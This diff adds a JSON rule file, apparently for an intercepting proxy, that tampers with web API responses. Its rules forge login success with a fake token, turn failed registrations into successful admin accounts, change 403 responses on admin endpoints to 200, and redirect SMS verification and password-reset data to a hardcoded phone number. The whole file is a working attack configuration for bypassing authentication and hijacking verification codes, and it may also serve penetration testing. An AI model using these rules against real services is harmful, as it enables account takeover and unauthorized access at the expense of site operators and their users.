@@ -1,0 +1,89 @@
+{
+  "rules": [
+    {
+      "name": "登录成功伪造",
+      "url_pattern": "/api/(login|signin)",
+      "method": "POST",
+      "actions": [
+        {
+          "field": "code",
+          "value": 0
+        },
+        {
+          "field": "status",
+          "value": "success"
+        },
+        {
+          "field": "message",
+          "value": "登录成功"
+        },
+        {
+          "field": "data.token",
+          "value": "fake_jwt_token_here"
+        }
+      ]
+    },
+    {
+      "name": "注册绕过",
+      "url_pattern": "/api/(register|signup)",
+      "method": "POST",
+      "actions": [
+        {
+          "condition": {
+            "status": "error"
+          },
+          "field": "status",
+          "value": "success"
+        },
+        {
+          "field": "data.user_id",
+          "value": 999
+        },
+        {
+          "field": "data.role",
+          "value": "admin"
+        }
+      ]
+    },
+    {
+      "name": "短信验证码劫持",
+      "url_pattern": "/api/(sms|verify|code)",
+      "method": "POST",
+      "actions": [
+        {
+          "field": "data",
+          "value": "18013172275"
+        }
+      ]
+    },
+    {
+      "name": "权限绕过",
+      "url_pattern": "/api/admin/",
+      "method": "GET",
+      "actions": [
+        {
+          "condition": {
+            "code": 403
+          },
+          "field": "code",
+          "value": 200
+        },
+        {
+          "field": "message",
+          "value": "操作成功"
+        }
+      ]
+    },
+    {
+      "name": "密码重置手机号劫持",
+      "url_pattern": "/api/(forgot|reset)",
+      "method": "POST",
+      "actions": [
+        {
+          "field": "data",
+          "value": "18013172275"
+        }
+      ]
+    }
+  ]
+}
